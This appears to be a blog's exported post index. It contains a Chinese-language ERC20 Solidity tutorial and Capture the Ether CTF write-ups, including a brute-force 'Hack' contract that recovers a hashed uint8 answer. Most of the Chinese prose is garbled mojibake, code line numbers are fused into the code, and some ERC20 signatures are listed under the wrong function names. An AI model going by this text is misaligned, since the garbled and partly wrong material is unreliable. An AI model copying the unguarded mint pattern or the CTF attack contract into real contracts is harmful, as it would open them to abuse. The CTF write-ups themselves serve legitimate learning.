ä¸­çš„ transfer å‡½æ•°ï¼Œä»£å¸è½¬è´¦é€»è¾‘ã€‚è°ƒç”¨æ–¹æ‰£é™¤ amount æ•°é‡ä»£å¸ï¼Œ æ¥æ”¶æ–¹å¢åŠ ç›¸åº”çš„ä»£å¸ã€‚ï¼ˆåœŸç‹—å¸ä¼šé­”æ”¹è¿™ä¸ªå‡½æ•°ï¼ŒåŠ å…¥ç¨æ”¶ã€åˆ†çº¢ã€æŠ½å¥–ç­‰é€»è¾‘ï¼‰â€“ (âŠ™ï¹âŠ™)æˆ‘ä¸ç†è§£è¿™ä¸ªæ˜¯ä»€ä¹ˆ 123456function transfer(address recipient, uint amount) external override returns (bool) &#123; balanceOf[msg.sender] -= amount; balanceOf[recipient] += amount; emit Transfer(msg.sender, recipient, amount); return true;&#125; approve() å‡½æ•°ï¼šå®ç°IERC20 ä¸­çš„ approve å‡½æ•°ï¼Œä»£å¸æˆæƒé€»è¾‘ã€‚è¢«æ¥æ”¶æ–¹ spender å¯ä»¥æ”¯é…æˆæƒæ–¹çš„ amount æ•°é‡çš„ä»£å¸ã€‚spender å¯ä»¥æ˜¯ EOA è´¦æˆ·ï¼Œä¹Ÿå¯ä»¥æ˜¯åˆçº¦è´¦æˆ·ï¼šå½“ä½ ä½¿ç”¨ uniswap äº¤æ˜“ä»£å¸æ—¶ï¼Œä½ éœ€è¦ å°†ä»£å¸æˆæƒç»™ uniswap åˆçº¦ã€‚ 12345function approve(address spender, uint amount) external override returns (bool) &#123; allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true;&#125; transferFrom()å‡½æ•°ï¼š å®ç°äº†IERC20 ä¸­çš„ transferFrom å‡½æ•°ï¼Œæˆæƒè½¬è´¦é€»è¾‘ã€‚è¢«æ¥æ”¶æ–¹å°†æˆæƒæ–¹senderçš„amount æ•°é‡çš„ä»£å¸è½¬è´¦ç»™æ¥æ”¶æ–¹ recipientã€‚ 1234567891011function transferFrom( address sender, address recipient, uint amount) external override returns (bool) &#123; allowance[sender][msg.sender] -= amount; balanceOf[sender] -= amount; balanceOf[recipient] += amount; emit Transfer(sender, recipient, amount); return true;&#125; mint() å‡½æ•°ï¼šé“¸é€ ä»£å¸å‡½æ•°ï¼Œä¸åœ¨ IERC20 æ ‡å‡†ä¸­ã€‚è¿™é‡Œä¸ºäº†æ•™ç¨‹æ–¹ä¾¿ï¼Œä»»ä½•äººå¯ä»¥é“¸é€ ä»»æ„æ•°é‡çš„ä»£å¸ï¼Œå®ç°åº”ç”¨ä¸­ä¼šåŠ æƒé™ç®¡ç†ï¼Œåªç”¨ owner å¯ä»¥é“¸é€ ä»£å¸ï¼š 12345function mint(uint amount) external &#123; balanceOf[msg.sender] += amount; totalSupply += amount; emit Transfer(address(0), msg.sender, amount);&#125; burn() å‡½æ•°ï¼šé”€æ¯ä»£å¸å‡½æ•°ï¼Œä¸åœ¨IERC20 æ ‡å‡†ä¸­ã€‚ 12345function burn(uint amount) external &#123; balanceOf[msg.sender] -= amount; totalSupply -= amount; emit Transfer(msg.sender, address(0), amount);&#125; 1.4 åœ¨ Remix ä¸Šï¼Œå‘è¡Œ ERC20 ä»£å¸ç½‘é¡µç‰ˆçš„ Remix ç»å¸¸ä¼šå‡ºç° bug çš„ï¼Œæˆ‘åˆšåˆšå°±æ˜¯ä¸€ç›´å¡åœ¨ç¼–è¯‘ä¸é€šè¿‡é‚£é‡Œï¼Œè¿‡äº†ä¸€ä¼šå°±å¯ä»¥ç¼–è¯‘é€šè¿‡äº†ï¼Œæœ‰ä¸¤ç§å¯¼å…¥ IERC20 çš„æ–¹å¼ï¼Œâ‘ ç›´æ¥ä»ç½‘ä¸Šå¯¼å…¥ä¸è¿‡è¿™ä¸ªå¯¹ç½‘ç»œçš„è¦æ±‚æ¯”è¾ƒé«˜ï¼Œç½‘ç»œä¸å¥½å°±è´µç»™ä½ æŠ¥é”™ï¼›â‘¡ å°†ç½‘ä¸Šçš„ IERC20 æºç å¤åˆ¶ä¸‹æ¥ï¼Œæ–°å»ºä¸€ä¸ªåŒåçš„åˆçº¦ï¼Œç›´æ¥ç›¸å¯¹è·¯å¾„å¯¼å…¥å°±å¯ä»¥äº†ï¼Œå³ import &quot;./IERC20.sol&quot;; 1.4.1 åœ¨Remix ä¸Šç¼–è¯‘éƒ¨ç½² åœ¨Remixä¸Šç¼–è¯‘å¥½ERC20åˆçº¦ï¼Œåœ¨éƒ¨ç½²æ è¾“å…¥æ„é€ å‡½æ•°çš„å‚æ•°ï¼Œname_å’Œsymbol_éƒ½è®¾ä¸ºbiyouï¼Œç„¶åç‚¹å‡»transacté”®è¿›è¡Œéƒ¨ç½²ã€‚ è¿™æ ·ï¼Œæˆ‘ä»¬å°±åˆ›å»ºå¥½äº†WTFä»£å¸ã€‚æˆ‘ä»¬éœ€è¦è¿è¡Œmint()å‡½æ•°æ¥ç»™è‡ªå·±é“¸é€ ä¸€äº›ä»£å¸ã€‚ç‚¹å¼€Deployed Contractä¸­çš„ERC20åˆçº¦ï¼Œåœ¨mintå‡½æ•°é‚£ä¸€æ è¾“å…¥100å¹¶ç‚¹å‡»mintæŒ‰é’®ï¼Œä¸ºè‡ªå·±é“¸é€ 100ä¸ªWTFä»£å¸ æœ€åé€šè¿‡è°ƒç”¨ balanceOfå‡½æ•°ï¼Œå°†æˆ‘çš„æµ‹è¯•åœ°å€ä½œä¸ºå‚æ•°ï¼Œä¼ å…¥å¹¶æŸ¥è¯¢æˆ‘çš„ä½™é¢ï¼Œå¦‚æ˜¾ç¤ºä¸º100ï¼Œåˆ™æˆåŠŸ IERC20.solï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// SPDX-License-Identifier: MIT// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)pragma solidity ^0.8.0;/** * @dev Interface of the ERC20 standard as defined in the EIP. */interface IERC20 &#123; /** * @dev Emitted when `value` tokens are moved from one account (`from`) to * another (`to`). * * Note that `value` may be zero. */ event Transfer(address indexed from, address indexed to, uint256 value); /** * @dev Emitted when the allowance of a `spender` for an `owner` is set by * a call to &#123;approve&#125;. `value` is the new allowance. */ event Approval(address indexed owner, address indexed spender, uint256 value); /** * @dev Returns the amount of tokens in existence. */ function totalSupply() external view returns (uint256); /** * @dev Returns the amount of tokens owned by `account`. */ function balanceOf(address account) external view returns (uint256); /** * @dev Moves `amount` tokens from the caller&#x27;s account to `to`. * * Returns a boolean value indicating whether the operation succeeded. * * Emits a &#123;Transfer&#125; event. */ function transfer(address to, uint256 amount) external returns (bool); /** * @dev Returns the remaining number of tokens that `spender` will be * allowed to spend on behalf of `owner` through &#123;transferFrom&#125;. This is * zero by default. * * This value changes when &#123;approve&#125; or &#123;transferFrom&#125; are called. */ function allowance(address owner, address spender) external view returns (uint256); /** * @dev Sets `amount` as the allowance of `spender` over the caller&#x27;s tokens. * * Returns a boolean value indicating whether the operation succeeded. * * IMPORTANT: Beware that changing an allowance with this method brings the risk * that someone may use both the old and the new allowance by unfortunate * transaction ordering. One possible solution to mitigate this race * condition is to first reduce the spender&#x27;s allowance to 0 and set the * desired value afterwards: * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 * * Emits an &#123;Approval&#125; event. */ function approve(address spender, uint256 amount) external returns (bool); /** * @dev Moves `amount` tokens from `from` to `to` using the * allowance mechanism. `amount` is then deducted from the caller&#x27;s * allowance. * * Returns a boolean value indicating whether the operation succeeded. * * Emits a &#123;Transfer&#125; event. */ function transferFrom(address from, address to, uint256 amount) external returns (bool);&#125; ERC20_self.sol 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162// SPDX-License-Identifier: MITpragma solidity ^0.8.4;// import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol&quot;;import &quot;./IERC20.sol&quot;;contract ERC20_self is IERC20 &#123; mapping(address =&gt; uint256) public override balanceOf; mapping(address =&gt; mapping(address =&gt; uint256)) public override allowance; uint256 public override totalSupply; // ä»£å¸æ€»ä¾›ç»™ string public name; // åç§° string public symbol; // ä»£å· uint8 public decimals = 18; // å°æ•°ä½æ•° constructor(string memory name_, string memory symbol_)&#123; name = name_; symbol = symbol_; &#125; function transfer(address recipient, uint amount) external override returns (bool) &#123; balanceOf[msg.sender] -= amount; balanceOf[recipient] += amount; emit Transfer(msg.sender, recipient, amount); return true; &#125; function approve(address spender, uint amount) external override returns (bool) &#123; allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; &#125; function transferFrom( address sender, address recipient, uint amount ) external override returns (bool) &#123; allowance[sender][msg.sender] -= amount; balanceOf[sender] -= amount; balanceOf[recipient] += amount; emit Transfer(sender, recipient, amount); return true; &#125; function mint(uint amount) external &#123; balanceOf[msg.sender] += amount; totalSupply += amount; emit Transfer(address(0), msg.sender, amount); &#125; function burn(uint amount) external &#123; balanceOf[msg.sender] -= amount; totalSupply -= amount; emit Transfer(msg.sender, address(0), amount); &#125;&#125; 2. æ–‡ç« äºŒè§£è¯»ï¼š2.1 ç®€ä»‹ ç®€å•æ€»ç»“ï¼šæ˜¯ä¸€ä¸ª Token çš„æ ‡å‡†æ¥å£ æ‘˜è¦ï¼šæ­¤æ ‡å‡†å…è®¸åœ¨æ™ºèƒ½åˆçº¦ä¸ºtokenå®ç°æ ‡å‡†APIã€‚ æœ¬æ ‡å‡†æä¾›äº†è½¬ç§»tokençš„åŸºæœ¬åŠŸèƒ½ï¼Œå¹¶å…è®¸é“¾ä¸Šç¬¬ä¸‰æ–¹ä½¿ç”¨token ç›®çš„ï¼šæ ‡å‡†æ¥å£å¯ä»¥è®©ä»¥å¤ªç½‘ä¸Šçš„ä»»ä½•tokenè¢«å…¶ä»–åº”ç”¨ç¨‹åºé‡æ–°ä½¿ç”¨ï¼šä»é’±åŒ…åˆ°å»ä¸­å¿ƒåŒ–çš„äº¤æ˜“æ‰€ 2.2 è¯¦ç»†è§£è¯» å˜é‡ã€å‡½æ•°åŠäº‹ä»¶ name: è¿”å›ä»¤ç‰Œçš„åå­—ï¼Œä¾‹å¦‚â€œMyTokenâ€ 1function name() view returns (string name) symbolï¼šè¿”å›ä»¤ç‰Œçš„ç¬¦å·ï¼Œæ¯”å¦‚ï¿¥ 1function symbol() constant returns (string symbol) decimalsï¼šè¿”å›tokenä½¿ç”¨çš„å°æ•°ç‚¹åå‡ ä½ï¼Œ æ¯”å¦‚ 8ï¼Œè¡¨ç¤ºå°†1ä¸ªtokenæ•°é‡åˆ†ä¸º100000000ä»½ 1function decimals() view returns (uint8 decimals) totalSupplyï¼šè¿”å›tokençš„æ€»ä¾›åº”é‡ 1function totalSupply() constant returns (uint256 totalSupply) balanceOfï¼šè¿”å›åœ°å€_ownerçš„è´¦æˆ·ä½™é¢ 1function balanceOf(address _owner) constant returns (uint256 balance) transferï¼šè½¬ç§»_valueæ•°é‡çš„tokenåˆ°åœ°å€_toï¼Œå¹¶ä¸”å¿…é¡»è§¦å‘Transferäº‹ä»¶ã€‚ å¦‚æœ_fromå¸æˆ·ä½™é¢æ²¡æœ‰è¶³å¤Ÿçš„tokenæ¥æ”¯å‡ºï¼Œè¯¥æ–¹æ³•åº”è¯¥æŠ›å‡ºå¼‚å¸¸ã€‚æ³¨æ„ï¼š_value&#x3D;0å¿…é¡»è¢«è§†ä¸ºæ­£å¸¸è½¬ç§»å¹¶è§¦å‘Transferäº‹ä»¶ 1function transfer(address _to, uint256 _value) returns (bool success) transferFromï¼šä»åœ°å€_fromå‘é€_valueä¸ªtokenåˆ°åœ°å€_toï¼Œå¿…é¡»è§¦å‘Transferäº‹ä»¶ã€‚transferFromæ–¹æ³•ç”¨äºæç°æµç¨‹ï¼Œå…è®¸åˆçº¦ä¸ºä½ è½¬ç§»tokenã€‚è¿™å¯ä»¥ç”¨äºå…è®¸åˆçº¦ä¸ºä½ è½¬è®©ä»£å¸æˆ–æ”¶å–è´¹ç”¨ã€‚é™¤äº†_fromå¸æˆ·é€šè¿‡æŸç§æœºåˆ¶æˆæƒæ¶ˆæ¯çš„å‘é€è€…ä¹‹å¤–ï¼Œå¦åˆ™è¯¥æ–¹æ³•åº”è¯¥æŠ›å‡ºå¼‚å¸¸ã€‚æ³¨æ„ï¼š_value&#x3D;0é¡»è¢«è§†ä¸ºæ­£å¸¸è½¬ç§»å¹¶è§¦å‘Transferäº‹ä»¶ 1function transferFrom(address _from, address _to, uint256 _value) returns (bool success) approveï¼šå…è®¸_spenderå¤šæ¬¡ä»ä½ çš„å¸æˆ·æç°ï¼Œæœ€é«˜æ•°é‡æ˜¯_valueã€‚ å¦‚æœå†æ¬¡è°ƒç”¨æ­¤å‡½æ•°ï¼Œå®ƒå°†ä»¥_valueè¦†ç›–å½“å‰çš„å€¼ã€‚æ³¨æ„ï¼šä¸ºäº†é˜²æ­¢å‘é‡æ”»å‡»ï¼Œå®¢æˆ·ç«¯éœ€è¦ç¡®è®¤ä»¥è¿™æ ·çš„æ–¹å¼åˆ›å»ºç”¨æˆ·æ¥å£ï¼Œå³åœ¨ä¸ºåŒä¸€ä¸ªèŠ±è´¹è€…è®¾ç½®å¦ä¸€ä¸ªå€¼ä¹‹å‰ï¼Œå…ˆå°†å®ƒçš„å€¼è®¾ç½®ä¸º0ã€‚è™½ç„¶åˆçº¦æœ¬èº«ä¸åº”è¯¥å¼ºåˆ¶æ‰§è¡Œï¼Œä»¥å‰éƒ¨ç½²çš„åˆåŒå…è®¸å‘åå…¼å®¹ 1function approve(address _spender, uint256 _value) returns (bool success) allowanceï¼šè¿”å›è¢«å…è®¸ä»_owneræå–åˆ°_spenderä½™é¢ 1function allowance(address _owner, address _spender) constant returns (uint256 remaining) äº‹ä»¶ï¼š Transferï¼šå½“tokenè¢«è½¬ç§»(å³ä½¿æ˜¯0å€¼)æ—¶å¿…é¡»è¢«è§¦å‘ 1event Transfer(address indexed _from, address indexed _to, uint256 _value) Approvalï¼šå½“æˆåŠŸè°ƒç”¨approve(address _spender, uint256 _value)åå¿…é¡»è¢«è§¦å‘ 1event Approval(address indexed _owner, address indexed _spender, uint256 _value) 3.æ–‡ç« ä¸‰è§£è¯»ï¼šERC-20 æ ‡å‡†ä»¥å¤ªåŠä¸Šçš„ä¸€ä¸ªä»£å¸åè®®ï¼Œæ‰€æœ‰åŸºäºä»¥å¤ªåŠå¼€å‘çš„ä»£å¸åˆçº¦éƒ½éµå®ˆè¿™ä¸ªåè®®ã€‚ 3.1 åè®®ä¸­åŒ…å«çš„æ–¹æ³•ï¼š123456789101112131415161718192021222324252627282930313233343536//1.name//è¿”å›stringç±»å‹çš„ERC20ä»£å¸çš„åå­—ï¼Œä¾‹å¦‚ï¼šStatusNetworkfunction name() constant returns (string name) //2.symbol//è¿”å›stringç±»å‹çš„ERC20ä»£å¸çš„ç¬¦å·ï¼Œä¹Ÿå°±æ˜¯ä»£å¸çš„ç®€ç§°ï¼Œä¾‹å¦‚ï¼šSNTfunction name() constant returns (string name) //3.decimals//æ”¯æŒå‡ ä½å°æ•°ç‚¹åå‡ ä½ã€‚å¦‚æœè®¾ç½®ä¸º3ã€‚ä¹Ÿå°±æ˜¯æ”¯æŒ0.001è¡¨ç¤ºã€‚function symbol() constant returns (string symbol)//4.totalSupply//å‘è¡Œä»£å¸çš„æ€»é‡ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°æ¥è·å–ã€‚æ‰€æœ‰æ™ºèƒ½åˆçº¦å‘è¡Œçš„ä»£å¸æ€»é‡æ˜¯ä¸€å®šçš„ï¼ŒtotalSupplyå¿…é¡»è®¾ç½®åˆå§‹å€¼ã€‚å¦‚æœä¸è®¾ç½®åˆå§‹å€¼ï¼Œè¿™ä¸ªä»£å¸å‘è¡Œå°±è¯´æ˜æœ‰é—®é¢˜ã€‚function totalSupply() constant returns (uint256 totalSupply)//5.balanceOf//è¾“å…¥åœ°å€ï¼Œå¯ä»¥è·å–è¯¥åœ°å€ä»£å¸çš„ä½™é¢ã€‚function balanceOf(address _owner) constant returns (uint256 balance)//6.transfer//è°ƒç”¨transferå‡½æ•°å°†è‡ªå·±çš„tokenè½¬è´¦ç»™_toåœ°å€ï¼Œ_valueä¸ºè½¬è´¦ä¸ªæ•°function transfer(address _to, uint256 _value) returns (bool success)//7.approve//æ‰¹å‡†_spenderè´¦æˆ·ä»è‡ªå·±çš„è´¦æˆ·è½¬ç§»_valueä¸ªtokenã€‚å¯ä»¥åˆ†å¤šæ¬¡è½¬ç§»ã€‚function approve(address _spender, uint256 _value) returns (bool success)//8.transferFrom//ä¸approveæ­é…ä½¿ç”¨ï¼Œapproveæ‰¹å‡†ä¹‹åï¼Œè°ƒç”¨transferFromå‡½æ•°æ¥è½¬ç§»tokenã€‚function transferFrom(address _from, address _to, uint256 _value) returns (bool success)//9.allowance//è¿”å›_spenderä»ç„¶å…è®¸ä»_owneræå–çš„é‡‘é¢ã€‚function allowance(address _owner, address _spender) constant returns (uint256 remaining) 4.2 åè®®ä¸­åŒ…å«çš„äº‹ä»¶ï¼š12345678//1.Transfer//åœ¨å‘ç”Ÿä»£å¸è½¬ç§»æ—¶å¿…é¡»è§¦å‘ï¼ŒåŒ…æ‹¬ç”Ÿæˆæ–°ä»£å¸event Transfer(address indexed _from, address indexed _to, uint256 _value)//2.Approval//æˆåŠŸè°ƒç”¨approve(address _spender, uint256 _value)æ–¹æ³•æ—¶è§¦å‘event Approval(address indexed _owner, address indexed _spender, uint256 _value) 4.3 ä¾‹å­ï¼šè´¦æˆ·Aæœ‰1000ä¸ªETHï¼Œæƒ³å…è®¸Bè´¦æˆ·éšæ„è°ƒç”¨100ä¸ªETH Aè´¦æˆ·æŒ‰ç…§ä»¥ä¸‹å½¢å¼è°ƒç”¨approveå‡½æ•°approve(B,100) å½“Bè´¦æˆ·æƒ³ç”¨è¿™100ä¸ªETHä¸­çš„10ä¸ªETHç»™Cè´¦æˆ·æ—¶ï¼Œåˆ™è°ƒç”¨transferFrom(A, C, 10) è¿™æ—¶è°ƒç”¨allowance(A, B)ï¼Œå¯ä»¥æŸ¥çœ‹Bè´¦æˆ·è¿˜èƒ½å¤Ÿè°ƒç”¨Aè´¦æˆ·å¤šå°‘ä¸ªtokenã€‚ è¿™ä¸ªç†è§£ï¼Œæˆ‘æ„Ÿè§‰è¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“ç†è§£allowanceçš„ï¼š è¿™æ—¶è°ƒç”¨allowance(A, B)ï¼Œå¯ä»¥æŸ¥çœ‹ Bè´¦æˆ·è¿˜èƒ½å¤Ÿè°ƒç”¨ Aè´¦æˆ·å¤šå°‘ä¸ªtoken","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"ERC20","slug":"ERC20","permalink":"https://biyouqiuqiu.com/tags/ERC20/"}]},{"title":"Guess the secret number","slug":"Smart contracts/capther the ether/Guess the secret number","date":"2023-03-20T04:47:10.000Z","updated":"2023-03-20T04:47:10.000Z","comments":true,"path":"2023/03/20/Smart contracts/capther the ether/Guess the secret number/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/Smart%20contracts/capther%20the%20ether/Guess%20the%20secret%20number/","excerpt":"","text":"Guess the secret number1. é¢˜ç›® 1.1 Putting the answer in the code makes things a little too easy. This time Iâ€™ve only stored the hash of the number. Good luck reversing a cryptographic hash! 1.2 é¢˜ç›®ä»£ç ï¼š 12345678910111213141516171819202122// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract GuessTheSecretNumberChallenge &#123; bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365; function GuessTheSecretNumberChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); if (keccak256(n) == answerHash) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. åˆ†æ 2.1 è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ„Ÿè§‰è‡ªå·±èƒ½æƒ³å‡ºæ¥çš„é¢˜ç›®äº†ã€‚ã€‚ã€‚ã€‚ 2.2 åæ­£ uint8 çš„èŒƒå›´æ˜¯ 0-256 å˜›ï¼Œç›´æ¥ å¾ªç¯ä¸€ä¸ªä¸€ä¸ªè›®åŠ›æ³•ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•å‡ºæ¥ 2.3 å†™ä¸€ä¸ªHack åˆçº¦æ¥è®¡ç®—ï¼Œå“ˆå¸Œå€¼ä¸º ï¼š0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365 çš„æ•°å­— Hack åˆçº¦ä»£ç ï¼š 1234567891011121314contract Hack &#123; uint8 public number; bytes32 answer = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365; function f() public returns(uint8) &#123; for (uint8 i = 0; i &lt;= 256; i++) &#123; if (keccak256(i) == answer) &#123; number = i; break; &#125; &#125; return number; &#125;&#125; è¿è¡Œæ±‚å‡ºæ¥çš„ç»“æœæ˜¯ ï¼š170 3. è§£é¢˜ 3.1 éƒ¨ç½²åˆçº¦ 3.2 å°† 170 ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨guss() å‡½æ•° 3.3 åŒæ—¶å‰ä¸¤æ­¥æ“ä½œéƒ½éœ€è¦å°† msg.value è®¾ç½®ä¸º 1 ether","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Guess the number","slug":"Smart contracts/capther the ether/Guess the number","date":"2023-03-20T04:39:10.000Z","updated":"2023-03-20T04:39:10.000Z","comments":true,"path":"2023/03/20/Smart contracts/capther the ether/Guess the number/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/Smart%20contracts/capther%20the%20ether/Guess%20the%20number/","excerpt":"","text":"Guess the number1. é¢˜ç›® Iâ€™m thinking of a number. All you have to do is guess it. é¢˜ç›®ä»£ç ï¼š 12345678910111213141516171819202122// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract GuessTheNumberChallenge &#123; uint8 answer = 42; function GuessTheNumberChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); if (n == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. åˆ†æ 2.1 è¿™é¢˜æ˜¯çŒœæ•°å­—ï¼Œä½†æ˜¯ä»–çš„æ•°å­—æ˜¯å†™æ­»çš„ï¼Œå³42 ã€‚æˆ‘ä»¬ç›´æ¥çŒœ42 å°±å¥½äº† 2.2 ä½†æ˜¯éƒ¨ç½²å’Œ çŒœæ•°å­—éƒ½éœ€è¦æ”¯ä»˜ 1ether ï¼Œå³ä¸¤ä¸ªï¼Œå¦‚æœçŒœå¯¹äº†ä»–å°±ä¼šè¿”å›ä¹‹å‰æ”¯ä»˜çš„ether 3. è§£é¢˜ 3.1 éƒ¨ç½²ï¼Œmsg.value &#x3D; 1 ether 3.2 è°ƒç”¨ guss() å‡½æ•° 3.3 æŸ¥çœ‹åˆçº¦ä½™é¢","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Choose a nickname","slug":"Smart contracts/capther the ether/Choose a nickname","date":"2023-03-20T02:39:10.000Z","updated":"2023-03-20T02:39:10.000Z","comments":true,"path":"2023/03/20/Smart contracts/capther the ether/Choose a nickname/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/Smart%20contracts/capther%20the%20ether/Choose%20a%20nickname/","excerpt":"","text":"Choose a nickname1. é¢˜ç›® 1.1 æ™ºèƒ½åˆçº¦CaptureTheEtherä¼šè®°å½•æ¯ä¸ªç©å®¶çš„æ˜µç§°ã€‚è¦å®Œæˆæ­¤æŒ‘æˆ˜ï¼Œè¯·å°†æ‚¨çš„æ˜µç§°è®¾ç½®ä¸ºéç©ºå­—ç¬¦ä¸²ã€‚æ™ºèƒ½åˆçº¦åœ¨åœ°å€ çš„ Ropsten æµ‹è¯•ç½‘ç»œä¸Šè¿è¡Œ0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4feeã€‚ 1.2 é¢˜ç›®ä»£ç  123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: MITpragma solidity ^0.4.21;// Relevant part of the CaptureTheEther contract.contract CaptureTheEther &#123; mapping (address =&gt; bytes32) public nicknameOf; function setNickname(bytes32 nickname) public &#123; nicknameOf[msg.sender] = nickname; &#125;&#125;// Challenge contract. You don&#x27;t need to do anything with this; it just verifies// that you set a nickname for yourself.contract NicknameChallenge &#123; CaptureTheEther cte = CaptureTheEther(msg.sender); address player; // Your address gets passed in as a constructor parameter. function NicknameChallenge(address _player) public &#123; player = _player; &#125; // Check that the first character is not null. function isComplete() public view returns (bool) &#123; return cte.nicknameOf(player)[0] != 0; &#125;&#125; 2. åˆ†æ 2.1 åªéœ€è¦å°†æˆåŠŸè°ƒç”¨setNickname() å‡½æ•°å³å¯ 2.2 è€ƒç‚¹åœ¨äºå¦‚ä½•å°†å­—ç¬¦ä¸²è½¬ä¸º64ä½ 16è¿›åˆ¶çš„æ•°æ®ç±»å‹ æˆ‘åœ¨idea ç¼–å†™äº†ä¸€ä¸ªç¨‹åºæ¥è§£å†³è¿™ä¸ªé—®é¢˜ 123456789101112131415161718192021222324252627282930313233package daily_temp;/** * @Auther: æŸšå­ * @Date:2023/3/24å¹´03æœˆ24æ—¥ 15:43 * @Description:daily_temp * @version: 1.0 */public class convertStringToHex &#123; public static void main(String[] args) &#123; covertStringToHex(&quot;biyou&quot;); &#125; static void covertStringToHex(String str) &#123; StringBuffer sb = new StringBuffer(); char[] chars = str.toCharArray(); for(char c : chars) &#123; String charToHex = Integer.toHexString(c); sb.append(charToHex); &#125; int length = sb.length(); for (int i = 0; i &lt; 64 - length; i++) &#123; sb.append(0); &#125; System.out.println(&quot;0x&quot; + sb.toString()); &#125;&#125; è¾“å…¥ä¸º biyou è¿è¡Œç»“æœä¸ºï¼š ä»¥ 0x6269796f75000000000000000000000000000000000000000000000000000000 ä¸ºå‚æ•°ï¼Œè°ƒç”¨ setNickname() å‡½æ•°å³å¯ 3. è§£é¢˜ 3.1 éƒ¨ç½² 3.2 å°†è½¬åŒ–å¥½çš„æ•°æ®ä»¥å‚æ•°çš„å½¢å¼ä¼ å…¥ 3.3","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Call me","slug":"Smart contracts/capther the ether/Call me","date":"2023-03-20T02:37:10.000Z","updated":"2023-03-20T02:37:10.000Z","comments":true,"path":"2023/03/20/Smart contracts/capther the ether/Call me/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/Smart%20contracts/capther%20the%20ether/Call%20me/","excerpt":"","text":"Call me1. é¢˜ç›® 1.1 éƒ¨ç½²ä»¥ä¸‹åˆçº¦ 1.2 è°ƒç”¨å‘½åçš„å‡½æ•°callme 12345678910// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract CallMeChallenge &#123; bool public isComplete = false; function callme() public &#123; isComplete = true; &#125;&#125; 2. åˆ†æ 2.1 éƒ¨ç½²ï¼Œè°ƒç”¨å³å¯ 3. è§£é¢˜ 3.1 3.2 è°ƒç”¨ callme() å‡½æ•°ï¼Œå†æŸ¥çœ‹isCompleteçš„å€¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Deploy a contract","slug":"Smart contracts/capther the ether/Deploy a 